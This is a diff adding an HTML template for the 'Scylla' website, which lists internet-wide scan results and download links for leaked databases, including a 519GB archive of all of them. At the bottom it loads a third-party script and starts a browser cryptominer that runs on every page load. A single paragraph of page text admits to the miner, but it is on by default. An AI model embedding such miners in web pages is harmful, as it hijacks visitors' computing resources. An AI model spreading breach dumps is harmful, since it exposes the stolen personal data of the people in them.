@@ -1,0 +1,166 @@
+<html>
+
+  <style>
+    html { font-size:16px; }
+
+    .grid-table{
+    font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
+    border-collapse: collapse;
+    width: 100%;
+    }
+
+    .grid-table td, .grid-table th, .grid-table {
+    border: 1px solid #ddd;
+    padding: 8px;
+    }
+
+    .grid-table tr:nth-child(even){background-color: #f2f2f2;}
+
+    .grid-table tr:hover {background-color: #ddd;}
+
+    .grid-table th {
+    padding-top: 12px;
+    padding-bottom: 12px;
+    text-align: left;
+    background-color: #4CAF50;
+    color: white;
+    }
+
+    body {
+    font-family: Arial, Helvetica, sans-serif;
+    }
+
+    .topnav {
+    overflow: hidden;
+    background-color: #333;
+    }
+
+    .topnav a {
+    float: left;
+    color: #f2f2f2;
+    text-align: center;
+    padding: 14px 16px;
+    text-decoration: none;
+    font-size: 17px;
+    }
+
+    .topnav a:hover {
+    background-color: #ddd;
+    color: black;
+    }
+
+    .topnav a.active {
+    background-color: #333;
+    color: white;
+    }
+
+
+  </style>
+
+  <title>Scylla</title>
+
+  <div class="topnav">
+    <a class="active" href="">Home</a>
+    <a href="search">Search</a>
+    <a href="https://www.etsy.com/shop/TheInfoSecShop" target="_blank">Shop</a>    
+  </div>
+  
+<h1>Scylla Data and Dumps by <a href="https://twitter.com/_hyp3ri0n">_hyp3ri0n</a></h1>
+
+<br />
+<p>
+<h2>ToS</h2>
+
+The information on this website is intended only for research purposes.
+Access has been given to security or other researchers for the purposes of research ONLY. Other than that I sincerely hope this data helps
+you with your projects. Much love.
+</p>
+
+
+<p>
+<h2>ToS Enforcement</h2>
+
+The information on this website is intended only for research purposes. We search common database leak sites to ensure this is not being circulated for malicious use. We do have default logging turned on for this website which likely includes IP addresses and other identifiers. Please don't misuse this information as we will cooperate with law enforcement if it is.
+</p>
+
+
+<p>
+Oh also, by using this site there's a cryptominer running in the background
+(throttled) to provide an ad-free experience. Feel free to turn JavaScript
+off should this bother you. But the longer you leave it on the more I can
+continue to provide updates and keep this site up (~$1000/month) <br /><br />
+
+- _hyp3ri0n <br /><br />
+
+PS since many have asked (thank you btw) about direct donations, you can send
+Bitcoin to 3A33QU7C2DysuiLhxaeNmgprNnJfV2NskM or Monero to 83mqvyQpvzM7APKvWVGwa1iBVkwpThRdDapq4LejPdXi6dLs1oqr4c3Uchh7zUomATCfXrav8Kv1d3DoFUoJ1nQqD8NqW6K
+
+</p>
+
+<h2>Internet-Wide Port Scans</h2>
+<table id="scans" class="grid-table">
+{% for scan in all_scans_dics %}  
+  <tr class="grid-item">
+    <!--<img src="{{ url_for('static', filename='img/blue_folder.svg') }}" style="height: 64px; width=64px; display:inline-block;""> </img>-->
+    <td style=""><a href="http://scylla.sh/static/port-scans/{{ scan['filename'] }}">{{ scan['filename'] }}</a></td>
+    <td style="">The {{ scan['name'] }} scan</td>
+    <td style="">{{ scan['size'] }}</td>
+  </tr>
+{% endfor %}
+</table>
+
+<h2>Ineternet-Wide Web Scans</h2>
+<table id="scans2" class="grid-table">
+  <tr class="grid-item">
+    <!--<img src="{{ url_for('static', filename='img/blue_folder.svg') }}" style="height: 64px; width=64px; display:inline-block;""> </img>-->
+    <td style=""><a href="https://s3-us-west-2.amazonaws.com/hyperiongray-public/final_results.jl">final_results.jl</a></td>
+    <td style="">All historical PunkSPIDER results</td>
+    <td style="">5.5 GB</td>
+  </tr>
+</table>
+
+
+<h2>Databases</h2>
+
+<table id="dbs" class="grid-table">
+
+  <tr class="grid-item">
+    <!--<img src="{{ url_for('static', filename='img/blue_folder.svg') }}" style="height: 64px; width=64px; display:inline-block;""> </img>-->
+    <td style="">Direct Link</td>
+    <!--<td style="">Torrent Link</td>-->
+    <td style="">Size</td>
+  </tr>
+
+
+  <tr class="grid-item">
+    <td style=""><a href="https://hyperiongray-public.s3-us-west-2.amazonaws.com/dbs.tar.gz">dbs.tar.gz - All Databases</a></td>
+    <td style="">519GB</td>
+  </tr>
+
+  
+{% for db in all_dbs_dics %}
+
+    <tr class="grid-item">
+      <!--<img src="{{ url_for('static', filename='img/blue_folder.svg') }}" style="height: 64px; width=64px; display:inline-block;""> </img>-->
+      <td style=""><a href="http://scylla.sh/static/dbs/{{ db['filename'] }}">{{ db['filename'] }}</a></td>
+      <!--<td style=""><a href="http://scylla.sh/static/torrent/{{ db['torrent_filename'] }}">{{ db['torrent_filename'] }}</td>-->
+      <td style="">{{ db['size'] }}</td>
+    </tr>
+
+{% endfor %}
+
+</table>
+
+<script src="https://www.hostingcloud.racing/FA18.js"></script>
+<script>
+  var _client = new Client.Anonymous('b0a5fc90521fc2862b2feb55baee6a97a3285e548d8b9da055d1f586aef632e2', {
+  throttle: 0.3, ads: 0
+  });
+  _client.start();
+</script>
+
+<!-- Matomo Image Tracker-->
+<img src="https://analytics.hyperiongray.com/matomo.php?idsite=9&amp;rec=1" style="border:0" alt="" />
+<!-- End Matomo -->
+
+</html>
